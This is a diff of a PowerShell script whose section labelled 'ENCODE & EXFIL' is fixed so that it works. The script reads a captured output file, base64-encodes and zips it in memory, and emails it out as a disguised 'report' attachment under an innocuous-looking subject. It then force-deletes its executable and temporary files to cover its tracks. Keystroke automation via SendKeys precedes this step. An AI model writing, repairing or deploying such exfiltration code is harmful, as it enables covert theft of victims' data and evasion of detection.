@@ -98,12 +98,11 @@ try {
     [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
     Start-Sleep -Milliseconds 500
 
-    # --- 5. ENCODE & EXFIL ---
-    # --- 5. ENCODE & EXFIL ---
+   # --- 5. ENCODE & EXFIL (Fixed Stream Logic) ---
     if ($v_p) { Stop-Process -Id $v_p.Id -Force }
     
     if (Test-Path $v_out) {
-        # Ensure Compression libraries are loaded
+        # Ensure Compression is loaded
         Add-Type -AssemblyName "System.IO.Compression"
         
         $r_raw = Get-Content $v_out -Raw
@@ -112,22 +111,30 @@ try {
         $v_bytes  = [System.Text.Encoding]::UTF8.GetBytes($r_raw)
         $v_base64 = [System.Convert]::ToBase64String($v_bytes)
 
-        # Zip Archive in Memory
+        # 1. Create MemoryStream
         $ms = New-Object System.IO.MemoryStream
-        # Explicitly calling the class with full namespace to avoid "Type Not Found" errors
-        $v_mode = [System.IO.Compression.ZipArchiveMode]::Create
-        $zip = New-Object System.IO.Compression.ZipArchive($ms, $v_mode)
+        
+        # 2. Create ZIP Archive
+        # We use a try/finally block to ensure the ZIP is written but the stream stays alive
+        $zip = New-Object System.IO.Compression.ZipArchive($ms, [System.IO.Compression.ZipArchiveMode]::Create, $true)
         
         $entry = $zip.CreateEntry("anihan.txt")
         $writer = New-Object System.IO.StreamWriter($entry.Open())
-        $writer.Write($v_base64) 
-        $writer.Close()
+        $writer.Write($v_base64)
+        
+        # 3. IMPORTANT: Dispose of writer and zip to flush data to the MemoryStream
+        $writer.Dispose()
         $zip.Dispose()
         
+        # 4. NOW reset position (Stream is still open because of the $true flag)
         $ms.Position = 0
+        
         $v_at = New-Object Net.Mail.Attachment($ms, "report_archived.zip")
         Send-V-Mail -sb "Ang pagaani sa bukirin - $currentDate" -at $v_at
+        
+        # 5. Finally, clean up the stream after the email is sent
         $v_at.Dispose()
+        $ms.Dispose()
     }
 
     Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
